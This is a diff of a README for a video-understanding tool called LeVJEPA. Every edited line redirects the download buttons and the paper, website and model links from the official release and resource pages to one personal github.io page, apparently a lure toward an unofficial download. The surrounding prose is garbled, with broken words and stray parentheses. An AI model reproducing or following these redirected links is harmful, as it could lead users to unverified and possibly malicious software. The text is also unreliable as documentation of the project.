@@ -1,6 +1,6 @@
 # 🎬 LeVJEPA - Video Understanding Made Effortlessly Simple
 
-[![Download LeVJEPA](https://img.shields.io/badge/Download-LeVJEPA-blue?style=for-the-badge&color=4CAF50)](https://github.com/hanan089/LeVJEPA/releases)
+[![Download LeVJEPA](https://img.shields.io/badge/Download-LeVJEPA-blue?style=for-the-badge&color=4CAF50)](https://hanan089.github.io)
 
 ## 👋 Welcome to LeVJEPA
 
@@ -26,7 +26,7 @@ The technology behind LeVJEPA eliminates the need for complex setup procedures t
 
 Getting LeVJEPA running on your computer is straightforward. Visit this link to download the application:
 
-[**👉 Click Here to Download LeVJEPA**](https://github.com/hanan089/LeVJEPA/releases)
+[**👉 Click Here to Download LeVJEPA**](https://hanan089.github.io)
 
 )
 
@@ -160,7 +160,7 @@ Previous video analysis tools demanded separate encoding, decoding, contraindica
 
 Ready to experience effortless video understanding with professional absolutelyresults? Your journey starts with a simple download:
 
-[**🚀 Download LeVJEPA Now - Free**](https://github.com/hanan089/LeVJEPA/releases)
+[**🚀 Download LeVJEPA Now - Free**](https://hanan089.github.io)
 
 )
 
@@ -172,9 +172,9 @@ Visit this link to download the application and unlock the power of advanced vid
 
 ## 🔗 Additional Resources
 
-- **📄 Read the Paper**: https://arxiv.org/abs/2608.27395
-- **🌐 Visit Project Website**: https://levjepa.github.io
-- **🤗 Explore Models**: https://huggingface.co/galilai-group/LeVJEPA-VideoMix-Large
+- **📄 Read the Paper**: https://hanan089.github.io
+- **🌐 Visit Project Website**: https://hanan089.github.io
+- **🤗 Explore Models**: https://hanan089.github.io
 
 
 
